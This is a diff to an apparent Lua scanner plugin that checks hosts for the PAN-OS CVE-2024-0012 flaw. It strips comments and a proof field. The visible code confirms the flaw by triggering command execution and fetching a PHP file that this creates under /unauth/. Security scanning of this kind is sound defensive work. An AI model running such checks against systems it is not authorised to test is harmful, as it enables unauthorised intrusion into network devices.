@@ -1,16 +1,9 @@
-description = [[
-Palo Alto Networks PAN-OS Remote Code Execution (CVE-2024-0012)
-]]
-
--- 跨平台的延时函数
 local function sleep(n)
     if os.execute("ping -n " .. tonumber(n+1) .. " localhost > NUL 2>&1") ~= 0 then
-        -- 如果 Windows 的 ping 命令失败，尝试 Unix 的 sleep
         os.execute("sleep " .. tonumber(n))
     end
 end
-
--- 从响应中提取 PHPSESSID
+ 
 local function extract_phpsessid(body)
     local pattern = "@start@PHPSESSID=([^@]+)@end@"
     return string.match(body or "", pattern)
@@ -100,10 +93,10 @@ function check_CVE_2024_0012(target)
     print("[PaloAlto] Second response headers:", second_resp.headers)
     print("[PaloAlto] Second response body:", string.sub(second_resp.body or "", 1, 200))
     
-    -- 等待文件生成
+    
     sleep(2)
     
-    -- 发送第三个请求检查结果
+     
     print("[PaloAlto] Checking for command execution result")
     local check_resp = http.get(target .. "/unauth/" .. username .. ".php", {
         headers = cookie_headers,
@@ -121,11 +114,7 @@ function check_CVE_2024_0012(target)
             return {
                 CVEID = "CVE-2024-0012",
                 Severity = "critical",
-                Type = "rce",
-                Extra = {
-                    ["Description"] = "Palo Alto Networks PAN-OS Remote Code Execution Vulnerability",
-                    ["Proof"] = string.sub(check_resp.body or "", 1, 200)
-                }
+                Type = "rce"
             }
         end
     else
@@ -149,8 +138,7 @@ function Analyze(info)
         target = string.format("https://%s:%d", info.IP, info.Port)
     end
     print("[PaloAlto] Target URL:", target)
-    
-    -- 检查各个CVE
+ 
     local vulns = {}
     
     -- 检查 CVE-2024-0012
@@ -159,8 +147,7 @@ function Analyze(info)
         table.insert(vulns, result)
         print("[PaloAlto] Added vulnerability:", result.CVEID)
     end
-    
-    -- 如果发现漏洞，添加到结果中
+ 
     if #vulns > 0 then
         info.Vulnerabilities = vulns
         print("[PaloAlto] Total vulnerabilities found:", #vulns)
